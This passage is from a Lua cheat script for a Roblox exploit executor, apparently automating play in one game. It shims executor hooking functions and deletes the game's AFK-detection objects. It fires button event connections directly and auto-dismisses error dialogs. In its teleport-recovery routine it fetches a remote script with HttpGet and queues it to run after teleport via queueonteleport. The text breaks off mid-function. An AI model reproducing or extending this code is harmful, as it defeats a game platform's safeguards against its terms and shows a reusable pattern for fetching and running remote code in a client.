repeat task.wait() until game:IsLoaded()

local missingFunctions = {}

if not getnamecallmethod then
    table.insert(missingFunctions, "getnamecallmethod")
    getgenv().getnamecallmethod = function()
        return "Unknown"
    end
    getnamecallmethod = getgenv().getnamecallmethod
end

if not newcclosure then
    table.insert(missingFunctions, "newcclosure")
    getgenv().newcclosure = function(f)
        return f
    end
    newcclosure = getgenv().newcclosure
end

if not getrawmetatable then
    table.insert(missingFunctions, "getrawmetatable")
end

if not setreadonly then
    table.insert(missingFunctions, "setreadonly")
    getgenv().setreadonly = function() end
    setreadonly = getgenv().setreadonly
end

if not getconnections then
    table.insert(missingFunctions, "getconnections")
    getgenv().getconnections = function()
        return {}
    end
    getconnections = getgenv().getconnections
end

if #missingFunctions > 0 then
    warn("[ALS] Executor compatibility mode enabled. Missing functions: " .. table.concat(missingFunctions, ", "))
    warn("[ALS] Macro recording may not work properly, but playback should function.")
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

repeat task.wait() until LocalPlayer

task.spawn(function()
    local RS = game:GetService("ReplicatedStorage")
    local StarterPlayer = game:GetService("StarterPlayer")
    
    local afkInstancesToRemove = {
        {parent = RS, path = {"FusionPackage", "Components", "Lobby", "AFKChamber"}},
        {parent = RS, path = {"FusionPackage", "Stories", "Lobby", "AFKChamber.story"}},
        {parent = RS, path = {"FusionPackage", "TestStories", "AFKChamber.story"}},
        {parent = StarterPlayer, path = {"StarterPlayerScripts", "AFK"}}
    }
    
    local removedCount = 0
    
    for _, instanceInfo in ipairs(afkInstancesToRemove) do
        pcall(function()
            local current = instanceInfo.parent
            for i = 1, #instanceInfo.path - 1 do
                current = current:FindFirstChild(instanceInfo.path[i])
                if not current then return end
            end
            
            if current then
                local target = current:FindFirstChild(instanceInfo.path[#instanceInfo.path])
                if target then
                    target:Destroy()
                    removedCount = removedCount + 1
                    print("[ALS] Removed AFK instance: " .. table.concat(instanceInfo.path, "."))
                end
            end
        end)
    end
    
    if removedCount > 0 then
        print("[ALS] ✅ Removed " .. removedCount .. " AFK-related instances")
    end
end)

getgenv().DebugMode = getgenv().DebugMode or false

local function debugPrint(...)
    if getgenv().DebugMode then
        print(...)
    end
end

getgenv().DebugPrint = debugPrint

if not getgenv().Config then
    getgenv().Config = {}
end

local savedLoadingMonitorConfig = getgenv().Config.loadingScreenMonitor or {}
getgenv().LoadingScreenMonitorConfig = {
    enabled = savedLoadingMonitorConfig.enabled ~= false,
    maxLoadingTime = savedLoadingMonitorConfig.maxLoadingTime or 30,
    checkInterval = savedLoadingMonitorConfig.checkInterval or 2,
    enableRecovery = savedLoadingMonitorConfig.enableRecovery ~= false
}

getgenv().LoadingScreenMonitor = getgenv().LoadingScreenMonitor or {
    isMonitoring = false,
    loadingStartTime = 0,
    maxLoadingTime = getgenv().LoadingScreenMonitorConfig.maxLoadingTime,
    checkInterval = getgenv().LoadingScreenMonitorConfig.checkInterval,
    monitoringConnection = nil
}

getgenv()._LoadingScreenMonitor_startMonitoring = function()
    local monitor = getgenv().LoadingScreenMonitor
    local config = getgenv().LoadingScreenMonitorConfig
    
    if not config.enabled then
        return
    end
    
    if monitor.isMonitoring then
        return
    end
    
    monitor.isMonitoring = true
    monitor.loadingStartTime = tick()
    
    if monitor.monitoringConnection then
        pcall(function()
            monitor.monitoringConnection:Disconnect()
        end)
    end
    
    monitor.monitoringConnection = task.spawn(function()
        while monitor.isMonitoring do
            task.wait(monitor.checkInterval)
            
            local isLoading, reason = getgenv()._LoadingScreenMonitor_isPlayerLoading()
            
            if isLoading then
                local duration = getgenv()._LoadingScreenMonitor_getLoadingDuration()
                
                local isFrozen, freezeDuration = getgenv()._LoadingScreenMonitor_checkForFreeze()
                
                if isFrozen then
                    warn(string.format("[LoadingScreenMonitor] Loading screen freeze detected! Duration: %.1fs | Reason: %s", 
                        freezeDuration, reason or "Unknown"))
                    
                    getgenv()._DiagnosticsLogger_logLoadingScreenFreeze(freezeDuration, reason)
                    
                    if getgenv().LoadingScreenMonitorConfig.enableRecovery then
                        getgenv()._RestartRecovery_attemptRecovery("loading_screen_freeze")
                    end
                    
                    getgenv()._LoadingScreenMonitor_stopMonitoring()
                    break
                end
            else
                getgenv()._LoadingScreenMonitor_stopMonitoring()
            end
        end
    end)
end

getgenv()._LoadingScreenMonitor_stopMonitoring = function()
    local monitor = getgenv().LoadingScreenMonitor
    
    if not monitor.isMonitoring then
        return
    end
    
    monitor.isMonitoring = false
    monitor.loadingStartTime = 0
    
    if monitor.monitoringConnection then
        pcall(function()
            if typeof(monitor.monitoringConnection) == "RBXScriptConnection" then
                monitor.monitoringConnection:Disconnect()
            end
        end)
        monitor.monitoringConnection = nil
    end
end

getgenv()._LoadingScreenMonitor_isPlayerLoading = function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    if not LocalPlayer then
        return false, "No LocalPlayer"
    end
    
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        return false, "Character loaded"
    end
    
    local hasLoadingUI = false
    local uiReason = ""
    
    pcall(function()
        local loadingUI = LocalPlayer.PlayerGui:FindFirstChild("LoadingUI")
        if loadingUI and loadingUI.Enabled then
            hasLoadingUI = true
            uiReason = "LoadingUI visible"
        end
        
        if not hasLoadingUI then
            local teleportUI = LocalPlayer.PlayerGui:FindFirstChild("TeleportUI")
            if teleportUI and teleportUI.Enabled then
                hasLoadingUI = true
                uiReason = "TeleportUI visible"
            end
        end
    end)
    
    if hasLoadingUI then
        return true, uiReason
    end
    
    if not LocalPlayer.Character then
        return true, "Character not loaded"
    end
    
    return false, "Not loading"
end

getgenv()._LoadingScreenMonitor_getLoadingDuration = function()
    local monitor = getgenv().LoadingScreenMonitor
    
    if monitor.loadingStartTime == 0 then
        return 0
    end
    
    return tick() - monitor.loadingStartTime
end

getgenv()._LoadingScreenMonitor_checkForFreeze = function()
    local monitor = getgenv().LoadingScreenMonitor
    
    local duration = getgenv()._LoadingScreenMonitor_getLoadingDuration()
    
    if duration > monitor.maxLoadingTime then
        return true, duration
    end
    
    return false, duration
end

getgenv()._LoadingScreenMonitor_updateConfig = function(key, value)
    local config = getgenv().LoadingScreenMonitorConfig
    local monitor = getgenv().LoadingScreenMonitor
    
    if config[key] ~= nil then
        config[key] = value
        
        if key == "maxLoadingTime" then
            monitor.maxLoadingTime = value
        elseif key == "checkInterval" then
            monitor.checkInterval = value
        end
        
        getgenv().Config.loadingScreenMonitor = getgenv().Config.loadingScreenMonitor or {}
        getgenv().Config.loadingScreenMonitor[key] = value
        getgenv().SaveConfig(getgenv().Config)
        
        warn(string.format("[LoadingScreenMonitor] Config updated: %s = %s", key, tostring(value)))
        return true
    end
    
    return false
end

getgenv()._LoadingScreenMonitor_getConfig = function()
    return getgenv().LoadingScreenMonitorConfig
end

local savedRestartRecoveryConfig = getgenv().Config.restartRecovery or {}
getgenv().RestartRecoveryConfig = {
    enabled = savedRestartRecoveryConfig.enabled ~= false,
    maxRetries = savedRestartRecoveryConfig.maxRetries or 3,
    retryDelay = savedRestartRecoveryConfig.retryDelay or 5,
    characterLoadTimeout = savedRestartRecoveryConfig.characterLoadTimeout or 15,
    autoExecuteOnRecover = savedRestartRecoveryConfig.autoExecuteOnRecover ~= false
}

getgenv().RestartRecovery = getgenv().RestartRecovery or {
    maxRetries = getgenv().RestartRecoveryConfig.maxRetries,
    retryDelay = getgenv().RestartRecoveryConfig.retryDelay,
    currentAttempt = 0,
    characterLoadTimeout = getgenv().RestartRecoveryConfig.characterLoadTimeout,
    isRecovering = false
}

getgenv()._RestartRecovery_attemptRecovery = function(reason)
    local recovery = getgenv().RestartRecovery
    local config = getgenv().RestartRecoveryConfig
    
    if not config.enabled then
        warn("[RestartRecovery] Recovery is disabled in config")
        return false
    end
    
    if recovery.isRecovering then
        warn("[RestartRecovery] Recovery already in progress")
        return false
    end
    
    recovery.isRecovering = true
    recovery.currentAttempt = 0
    
    warn(string.format("[RestartRecovery] Starting recovery process. Reason: %s", reason or "Unknown"))
    
    local success = false
    
    for attempt = 1, recovery.maxRetries do
        recovery.currentAttempt = attempt
        
        warn(string.format("[RestartRecovery] Recovery attempt %d/%d", attempt, recovery.maxRetries))
        
        if attempt > 1 then
            task.wait(recovery.retryDelay)
        end
        
        if attempt == 1 then
            success = getgenv()._RestartRecovery_performRecoveryTeleport()
        elseif attempt == 2 then
            warn("[RestartRecovery] Attempt 2: Forcing connection cleanup before teleport")
            pcall(function()
                if getgenv().ConnectionManager then
                    getgenv().ConnectionManager:cleanup()
                end
            end)
            success = getgenv()._RestartRecovery_performRecoveryTeleport()
        elseif attempt == 3 then
            warn("[RestartRecovery] Attempt 3: Full memory cleanup before teleport")
            pcall(function()
                if getgenv().ConnectionManager then
                    getgenv().ConnectionManager:cleanup()
                end
                collectgarbage("collect")
            end)
            success = getgenv()._RestartRecovery_performRecoveryTeleport()
        end
        
        if success then
            local charLoaded = getgenv()._RestartRecovery_waitForCharacterLoad(recovery.characterLoadTimeout)
            
            if charLoaded then
                warn(string.format("[RestartRecovery] Recovery successful on attempt %d", attempt))
                getgenv()._RestartRecovery_notifyRecoveryStatus(true, "Recovery successful")
                
                getgenv()._DiagnosticsLogger_logRecoveryAction(
                    reason,
                    "recovery_teleport",
                    "success",
                    {attempt = attempt, totalAttempts = recovery.maxRetries}
                )
                
                recovery.isRecovering = false
                return true
            else
                warn(string.format("[RestartRecovery] Character failed to load after teleport (attempt %d)", attempt))
            end
        else
            warn(string.format("[RestartRecovery] Teleport failed (attempt %d)", attempt))
        end
    end
    
    warn(string.format("[RestartRecovery] All %d recovery attempts failed", recovery.maxRetries))
    getgenv()._RestartRecovery_notifyRecoveryStatus(false, "Recovery failed after " .. recovery.maxRetries .. " attempts")
    
    getgenv()._DiagnosticsLogger_logRecoveryAction(
        reason,
        "recovery_teleport",
        "failed",
        {attempts = recovery.maxRetries, reason = "all_attempts_exhausted"}
    )
    
    recovery.isRecovering = false
    
    return false
end

getgenv()._RestartRecovery_queueAutoExecute = function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local config = getgenv().RestartRecoveryConfig
    
    if not config.autoExecuteOnRecover then
        return true
    end
    
    if not queueonteleport then
        warn("[RestartRecovery] queueonteleport not available")
        return false
    end
    
    local scriptSource = game:HttpGet("https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt")
    
    if not scriptSource or scriptSource == "" then
        warn("[RestartRecovery] Failed to fetch script source for auto-execute")
        return false
    end
    
    local success = pcall(function()
        queueonteleport(scriptSource)
    end)
    
    if success then
        return true
    else
        warn("[RestartRecovery] Failed to queue script for auto-execute")
        return false
    end
end

getgenv()._RestartRecovery_performRecoveryTeleport = function()
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    if not LocalPlayer then
        warn("[RestartRecovery] LocalPlayer not found")
        return false
    end
    
    if not getgenv()._LastRecoveryTeleportTime then
        getgenv()._LastRecoveryTeleportTime = 0
    end
    
    local currentTime = tick()
    local timeSinceLastTeleport = currentTime - getgenv()._LastRecoveryTeleportTime
    local MIN_COOLDOWN = 10
    
    if timeSinceLastTeleport < MIN_COOLDOWN then
        return false
    end
    
    getgenv()._RestartRecovery_queueAutoExecute()
    
    if ConnectionManager then
        ConnectionManager:disconnectAll()
    end
    
    pcall(function()
        collectgarbage("collect")
    end)
    
    task.wait(1)
    
    local gameId = 12886143095
    
    local success = pcall(function()
        TeleportService:Teleport(gameId, LocalPlayer)
    end)
    
    if success then
        getgenv()._LastRecoveryTeleportTime = tick()
        return true
    else
        warn("[RestartRecovery] TeleportService:Teleport failed")
        return false
    end
end

getgenv()._RestartRecovery_waitForCharacterLoad = function(timeout)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    if not LocalPlayer then
        return false
    end
    
    local startTime = tick()
    timeout = timeout or getgenv().RestartRecovery.characterLoadTimeout
    
    while (tick() - startTime) < timeout do
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local timeTaken = tick() - startTime
                return true, timeTaken
            end
        end
        
        task.wait(0.5)
    end
    
    return false, timeout
end

getgenv()._RestartRecovery_notifyRecoveryStatus = function(success, message)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    if not LocalPlayer then
        return
    end
    
    pcall(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCore("SendNotification", {
            Title = success and "Recovery Success" or "Recovery Failed",
            Text = message or (success and "Successfully recovered from loading screen freeze" or "Failed to recover"),
            Duration = success and 5 or 10
        })
    end)
    
    if success then
        warn("[RestartRecovery] " .. (message or "Recovery successful"))
    else
        warn("[RestartRecovery] CRITICAL: " .. (message or "Recovery failed"))
    end
end

getgenv()._RestartRecovery_updateConfig = function(key, value)
    local config = getgenv().RestartRecoveryConfig
    local recovery = getgenv().RestartRecovery
    
    if config[key] ~= nil then
        config[key] = value
        
        if key == "maxRetries" then
            recovery.maxRetries = value
        elseif key == "retryDelay" then
            recovery.retryDelay = value
        elseif key == "characterLoadTimeout" then
            recovery.characterLoadTimeout = value
        end
        
        getgenv().Config.restartRecovery = getgenv().Config.restartRecovery or {}
        getgenv().Config.restartRecovery[key] = value
        getgenv().SaveConfig(getgenv().Config)
        
        warn(string.format("[RestartRecovery] Config updated: %s = %s", key, tostring(value)))
        return true
    end
    
    return false
end

getgenv()._RestartRecovery_getConfig = function()
    return getgenv().RestartRecoveryConfig
end

getgenv().StateVerification = getgenv().StateVerification or {
    verificationTimeout = 10,
    requiredChecks = {"character", "gameStarted", "workspace"}
}

getgenv()._StateVerification_verifyCharacter = function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    if not LocalPlayer then
        return false, "LocalPlayer not found"
    end
    
    if not LocalPlayer.Character then
        return false, "Character does not exist"
    end
    
    if not LocalPlayer.Character.Parent then
        return false, "Character has no Parent"
    end
    
    local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
    if not humanoid then
        return false, "Humanoid not found"
    end
    
    if humanoid.Health <= 0 then
        return false, "Humanoid health is 0"
    end
    
    return true, "Character valid"
end

getgenv()._StateVerification_verifyGameStarted = function()
    local RS = game:GetService("ReplicatedStorage")
    
    local gameStarted = RS:FindFirstChild("GameStarted")
    
    return true, "GameStarted value accessible"
end

getgenv()._StateVerification_verifyWorkspace = function()
    local workspace = game:GetService("Workspace")
    
    local hasMap = workspace:FindFirstChild("Map") ~= nil
    local hasTowers = workspace:FindFirstChild("Towers") ~= nil
    local hasEnemies = workspace:FindFirstChild("Enemies") ~= nil

    
    local foundObjects = {}
    if hasMap then table.insert(foundObjects, "Map") end
    if hasTowers then table.insert(foundObjects, "Towers") end
    if hasEnemies then table.insert(foundObjects, "Enemies") end
    
    return true, "Workspace contains: " .. table.concat(foundObjects, ", ")
end

getgenv()._StateVerification_performFullVerification = function()
    local verification = getgenv().StateVerification
    local results = {}
    local allPassed = true
    
    local charValid, charReason = getgenv()._StateVerification_verifyCharacter()
    table.insert(results, {
        checkName = "Character",
        passed = charValid,
        reason = charReason,
        timestamp = tick()
    })
    if not charValid then
        allPassed = false
    end
    
    local gameStartedValid, gameStartedReason = getgenv()._StateVerification_verifyGameStarted()
    table.insert(results, {
        checkName = "GameStarted",
        passed = gameStartedValid,
        reason = gameStartedReason,
        timestamp = tick()
    })
    if not gameStartedValid then
        allPassed = false
    end
    
    local workspaceValid, workspaceReason = getgenv()._StateVerification_verifyWorkspace()
    table.insert(results, {
        checkName = "Workspace",
        passed = workspaceValid,
        reason = workspaceReason,
        timestamp = tick()
    })
    if not workspaceValid then
        allPassed = false
    end
    
    for _, result in ipairs(results) do
    end
    
    return allPassed, results
end

getgenv()._StateVerification_waitForValidState = function(timeout)
    local verification = getgenv().StateVerification
    timeout = timeout or verification.verificationTimeout
    
    local startTime = tick()
    
    while (tick() - startTime) < timeout do
        local allPassed, results = getgenv()._StateVerification_performFullVerification()
        
        if allPassed then
            local timeTaken = tick() - startTime
            return true, timeTaken
        end
        
        task.wait(1)
    end
    
    local timeTaken = tick() - startTime
    
    return false, timeTaken
end

getgenv().DiagnosticsLogger = getgenv().DiagnosticsLogger or {
    restartHistory = {},
    recoveryHistory = {},
    freezeHistory = {},
    memorySnapshots = {},
    maxHistorySize = 20
}

getgenv()._DiagnosticsLogger_logSeamlessRestart = function(count, maxRounds, detectionMethod)
    local logger = getgenv().DiagnosticsLogger
    
    local entry = {
        timestamp = tick(),
        count = count,
        maxRounds = maxRounds,
        method = detectionMethod,
        memoryBefore = collectgarbage("count")
    }
    
    table.insert(logger.restartHistory, entry)
    
    if #logger.restartHistory > logger.maxHistorySize then
        table.remove(logger.restartHistory, 1)
    end

    
    return entry
end

getgenv()._DiagnosticsLogger_logLoadingScreenFreeze = function(duration, playerState)
    local logger = getgenv().DiagnosticsLogger
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local stateDetails = {
        duration = duration,
        hasCharacter = LocalPlayer.Character ~= nil,
        characterParent = LocalPlayer.Character and LocalPlayer.Character.Parent ~= nil or false,
        hasHumanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") ~= nil or false,
        humanoidHealth = 0,
        loadingUIVisible = false,
        teleportUIVisible = false,
        timestamp = tick()
    }
    
    pcall(function()
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid then
                stateDetails.humanoidHealth = humanoid.Health
            end
        end
    end)
    
    pcall(function()
        local loadingUI = LocalPlayer.PlayerGui:FindFirstChild("LoadingUI")
        if loadingUI then
            stateDetails.loadingUIVisible = loadingUI.Enabled
        end
        
        local teleportUI = LocalPlayer.PlayerGui:FindFirstChild("TeleportUI")
        if teleportUI then
            stateDetails.teleportUIVisible = teleportUI.Enabled
        end
    end)
    
    table.insert(logger.freezeHistory, stateDetails)
    
    if #logger.freezeHistory > logger.maxHistorySize then
        table.remove(logger.freezeHistory, 1)
    end
    
    return stateDetails
end

getgenv()._DiagnosticsLogger_logRecoveryAction = function(reason, action, result, details)
    local logger = getgenv().DiagnosticsLogger
    
    local entry = {
        timestamp = tick(),
        reason = reason,
        action = action,
        result = result,
        details = details or {},
        memoryAfter = collectgarbage("count")
    }
    
    table.insert(logger.recoveryHistory, entry)
    
    if #logger.recoveryHistory > logger.maxHistorySize then
        table.remove(logger.recoveryHistory, 1)
    end
    
    if details and type(details) == "table" then
        for key, value in pairs(details) do
        end
    end
    
    return entry
end

getgenv()._DiagnosticsLogger_trackAverageRestartTime = function()
    local logger = getgenv().DiagnosticsLogger
    
    if #logger.restartHistory < 2 then
        return 0
    end
    
    local totalTime = 0
    local count = 0
    
    for i = 2, #logger.restartHistory do
        local timeDiff = logger.restartHistory[i].timestamp - logger.restartHistory[i-1].timestamp
        totalTime = totalTime + timeDiff
        count = count + 1
    end
    
    local avgTime = totalTime / count
    
    return avgTime
end

getgenv()._DiagnosticsLogger_logMemoryUsage = function(phase)
    local logger = getgenv().DiagnosticsLogger
    
    local memoryKB = collectgarbage("count")
    local memoryMB = memoryKB / 1024
    
    local snapshot = {
        timestamp = tick(),
        phase = phase,
        memoryKB = memoryKB,
        memoryMB = memoryMB
    }
    
    table.insert(logger.memorySnapshots, snapshot)
    
    if #logger.memorySnapshots > logger.maxHistorySize then
        table.remove(logger.memorySnapshots, 1)
    end
    
    if #logger.memorySnapshots >= 2 then
        local previous = logger.memorySnapshots[#logger.memorySnapshots - 1]
        local diff = memoryKB - previous.memoryKB
        local diffMB = diff / 1024
    end
    
    return snapshot
end

getgenv()._DiagnosticsLogger_getDiagnosticsSummary = function()
    local logger = getgenv().DiagnosticsLogger
    
    local summary = {
        totalRestarts = #logger.restartHistory,
        totalRecoveries = #logger.recoveryHistory,
        totalFreezes = #logger.freezeHistory,
        averageRestartTime = 0,
        currentMemoryMB = collectgarbage("count") / 1024,
        successfulRecoveries = 0,
        failedRecoveries = 0
    }
    
    if #logger.restartHistory >= 2 then
        summary.averageRestartTime = getgenv()._DiagnosticsLogger_trackAverageRestartTime()
    end
    
    for _, recovery in ipairs(logger.recoveryHistory) do
        if recovery.result == "success" then
            summary.successfulRecoveries = summary.successfulRecoveries + 1
        else
            summary.failedRecoveries = summary.failedRecoveries + 1
        end
    end
    
    return summary
end

getgenv().DiagnosticsLogger.discountHistory = getgenv().DiagnosticsLogger.discountHistory or {}
getgenv().DiagnosticsLogger.saveHistory = getgenv().DiagnosticsLogger.saveHistory or {}
getgenv().DiagnosticsLogger.crashWarnings = getgenv().DiagnosticsLogger.crashWarnings or {}
getgenv().DiagnosticsLogger.discountErrors = getgenv().DiagnosticsLogger.discountErrors or {}

getgenv()._DiagnosticsLogger_logDiscountCalculation = function(unitName, multiplier, enchant, success)
    if not getgenv().DebugMode then
        return
    end
    
    local logger = getgenv().DiagnosticsLogger
    
    local entry = {
        timestamp = tick(),
        unitName = unitName,
        multiplier = multiplier,
        enchant = enchant or "none",
        success = success
    }
    
    table.insert(logger.discountHistory, entry)
    
    if #logger.discountHistory > logger.maxHistorySize then
        table.remove(logger.discountHistory, 1)
    end
    
    if success then
        if multiplier < 1.0 then
            debugPrint(string.format("[Diagnostics] Discount: %s | Enchant: %s | Multiplier: %.2fx", 
                unitName, enchant, multiplier))
        else
            debugPrint(string.format("[Diagnostics] Discount: %s | No discount (%.2fx)", 
                unitName, multiplier))
        end
    else
        debugPrint(string.format("[Diagnostics] Discount: %s | Check failed, using default (%.2fx)", 
            unitName, multiplier))
    end
    
    return entry
end

getgenv()._DiagnosticsLogger_logDiscountError = function(unitName, errorMessage)
    if not getgenv().DebugMode then
        return
    end
    
    local logger = getgenv().DiagnosticsLogger
    
    local entry = {
        timestamp = tick(),
        unitName = unitName,
        error = errorMessage
    }
    
    table.insert(logger.discountErrors, entry)
    
    if #logger.discountErrors > logger.maxHistorySize then
        table.remove(logger.discountErrors, 1)
    end
    
    debugPrint(string.format("[Diagnostics] Discount Error: %s | Error: %s", unitName, errorMessage))
    
    return entry
end

getgenv()._DiagnosticsLogger_logSaveOperation = function(macroName, success, errorMessage, attempt, maxAttempts)
    if not getgenv().DebugMode then
        return
    end
    
    local logger = getgenv().DiagnosticsLogger
    
    local entry = {
        timestamp = tick(),
        macroName = macroName,
        success = success,
        error = errorMessage,
        attempt = attempt,
        maxAttempts = maxAttempts
    }
    
    table.insert(logger.saveHistory, entry)
    
    if #logger.saveHistory > logger.maxHistorySize then
        table.remove(logger.saveHistory, 1)
    end
    
    if success then
        if attempt and attempt > 1 then
            debugPrint(string.format("[Diagnostics] Save: %s | Success on attempt %d/%d", 
                macroName, attempt, maxAttempts))
        else
            debugPrint(string.format("[Diagnostics] Save: %s | Success", macroName))
        end
    else
        if attempt then
            debugPrint(string.format("[Diagnostics] Save: %s | Failed attempt %d/%d | Error: %s", 
                macroName, attempt, maxAttempts, errorMessage or "unknown"))
        else
            debugPrint(string.format("[Diagnostics] Save: %s | Failed | Error: %s", 
                macroName, errorMessage or "unknown"))
        end
    end
    
    return entry
end

getgenv()._DiagnosticsLogger_logCrashWarning = function(warningType, details)
    local logger = getgenv().DiagnosticsLogger
    
    local entry = {
        timestamp = tick(),
        warningType = warningType,
        details = details or {},
        memoryMB = collectgarbage("count") / 1024
    }
    
    table.insert(logger.crashWarnings, entry)
    
    if #logger.crashWarnings > logger.maxHistorySize then
        table.remove(logger.crashWarnings, 1)
    end
    
    if details and type(details) == "table" then
        for key, value in pairs(details) do
            if getgenv().DebugMode then
                debugPrint(string.format("[Diagnostics]   %s: %s", key, tostring(value)))
            end
        end
    end
    
    return entry
end


local ErrorHandler = {
    logLevel = "INFO",
    suppressPatterns = {
        "HttpService", 
        "MarketplaceService",
        "TeleportService"
    }
}

function ErrorHandler:log(level, message, data)
    if level == "DEBUG" and self.logLevel ~= "DEBUG" then
        return
    end
    
    for _, pattern in ipairs(self.suppressPatterns) do
        if message and message:find(pattern) then
            return
        end
    end
    
    local prefix = string.format("[%s]", level)
    local output = prefix .. " " .. tostring(message)
    
    if data then
        output = output .. " | Data: " .. tostring(data)
    end
    
    if level == "ERROR" then
        warn(output)
    else
        print(output)
    end
end

function ErrorHandler:wrap(func, context)
    return function(...)
        local success, result = pcall(func, ...)
        if not success then
            self:log("ERROR", string.format("%s failed: %s", context or "Operation", tostring(result)))
            return nil, result
        end
        return result
    end
end

function ErrorHandler:wrapAsync(func, context)
    local success, result = pcall(func)
    if not success then
        self:log("ERROR", string.format("%s failed: %s", context or "Operation", tostring(result)))
        return false, result
    end
    return true, result
end

function ErrorHandler:notify(window, title, message, isCritical)
    if window and window.Notify then
        pcall(function()
            window:Notify({
                Title = title or "Error",
                Description = message or "An error occurred",
                Lifetime = isCritical and 10 or 5,
                Style = "Cancel"
            })
        end)
    end
    
    if isCritical then
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = title or "Critical Error",
                Text = message or "A critical error occurred",
                Duration = 10
            })
        end)
    end
end

function ErrorHandler:notifyCritical(window, title, message)
    self:notify(window, title, message, true)
    self:log("ERROR", "CRITICAL: " .. (title or "Error") .. " - " .. (message or "Unknown"))
end

getgenv().ConnectionStability = getgenv().ConnectionStability or {
    lastRemoteCallTime = 0,
    minCallDelay = 0.15,
    callQueue = {},
    isProcessing = false,
    errorDialogActive = false,
    pausedUntil = 0,
    version = "1.1.0"
}


getgenv()._ConnectionStability_safeRemoteCall = function(remote, method, ...)
    local stability = getgenv().ConnectionStability
    local args = {...}
    
    if tick() < stability.pausedUntil then
        warn("[Connection] Calls paused due to connection error, waiting...")
        task.wait(stability.pausedUntil - tick())
    end
    
    local timeSinceLastCall = tick() - stability.lastRemoteCallTime
    if timeSinceLastCall < stability.minCallDelay then
        task.wait(stability.minCallDelay - timeSinceLastCall)
    end
    
    stability.lastRemoteCallTime = tick()
    
    getgenv()._SkipRecordingNextCall = true
    
    local success, result
    if method == "InvokeServer" then
        success, result = pcall(function()
            return remote:InvokeServer(unpack(args))
        end)
    else
        success, result = pcall(function()
            remote:FireServer(unpack(args))
            return true
        end)
    end
    
    getgenv()._SkipRecordingNextCall = false
    
    if not success then
        warn("[Connection] Remote call failed: " .. tostring(result))
    end
    
    return success, result
end

getgenv()._SafeClickButton = function(button, callback)
    getgenv()._SkipRecordingNextCall = true
    local success, result = pcall(callback or function()
        if getconnections then
            local events = {"Activated", "MouseButton1Click", "MouseButton1Down", "MouseButton1Up"}
            for _, eventName in ipairs(events) do
                local connections = getconnections(button[eventName])
                if connections then
                    for _, conn in ipairs(connections) do
                        if conn and conn.Fire then
                            conn:Fire()
                        end
                    end
                end
            end
        end
    end)
    getgenv()._SkipRecordingNextCall = false
    return success, result
end

task.spawn(function()
    while task.wait(1) do
        if getgenv()._SkipRecordingNextCall then
            getgenv()._SkipRecordingNextCall = false
        end
    end
end)

task.spawn(function()
    while task.wait(0.5) do
        pcall(function()
            if not LocalPlayer or not LocalPlayer.PlayerGui then return end
            
            local errorDialog = LocalPlayer.PlayerGui:FindFirstChild("ErrorPrompt") or
                               LocalPlayer.PlayerGui:FindFirstChild("ErrorDialog")
            
            if errorDialog and errorDialog.Enabled then
                local textFound = false
                
                for _, descendant in pairs(errorDialog:GetDescendants()) do
                    if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
                        local text = descendant.Text:lower()
                        if text:find("internet") or text:find("connection") or text:find("network") then
                            textFound = true
                            warn("[Connection] Connection error dialog detected! Auto-dismissing...")
                            
                            getgenv().ConnectionStability.errorDialogActive = true
                            getgenv().ConnectionStability.pausedUntil = tick() + 5
                            
                            for _, button in pairs(errorDialog:GetDescendants()) do
                                if button:IsA("TextButton") then
                                    local btnText = button.Text:lower()
                                    if btnText:find("ok") or btnText:find("dismiss") or btnText:find("close") then
                                        task.spawn(function()
                                            pcall(function()
                                                for i = 1, 3 do
                                                    if button and button.Parent then
                                                        local VIM = game:GetService("VirtualInputManager")
                                                        local GuiService = game:GetService("GuiService")
                                                        
                                                        GuiService.SelectedObject = button
                                                        task.wait(0.1)
                                                        VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                                                        task.wait(0.05)
                                                        VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                                                        task.wait(0.2)
                                                    end
                                                end
                                            end)
                                        end)
                                        break
                                    end
                                end
                            end
                            break
                        end
                    end
                end
                
                if textFound then
                    task.wait(2)
                    if errorDialog and errorDialog.Enabled then
                        pcall(function()
                            errorDialog.Enabled = false
                        end)
                    end
                end
            end
        end)
    end
end)

task.spawn(function()
    local characterWaitTime = 0
    local maxCharacterWait = 30
    
    pcall(function()
        if getgenv()._LoadingScreenMonitor_startMonitoring then
            getgenv()._LoadingScreenMonitor_startMonitoring()
        end
    end)
    
    pcall(function()
        if getgenv()._CrashMonitor_startMonitoring then
            getgenv()._CrashMonitor_startMonitoring()
        end
    end)
    
    while not LocalPlayer.Character and characterWaitTime < maxCharacterWait do
        task.wait(0.5)
        characterWaitTime = characterWaitTime + 0.5
        
        local loadingUI = LocalPlayer.PlayerGui:FindFirstChild("LoadingUI") or 
                          LocalPlayer.PlayerGui:FindFirstChild("TeleportUI")
        
        if loadingUI and loadingUI.Enabled then
            characterWaitTime = 0 
        end
        
        local isFrozen, freezeDuration = getgenv()._LoadingScreenMonitor_checkForFreeze()
        if isFrozen then
            warn(string.format("[ALS] Loading screen freeze detected during initial load (%.1fs)", freezeDuration))
            break
        end
    end
    
    getgenv()._LoadingScreenMonitor_stopMonitoring()
    
    if not LocalPlayer.Character and characterWaitTime >= maxCharacterWait then
        warn("[ALS] Character not loaded after " .. maxCharacterWait .. "s, attempting recovery...")
        
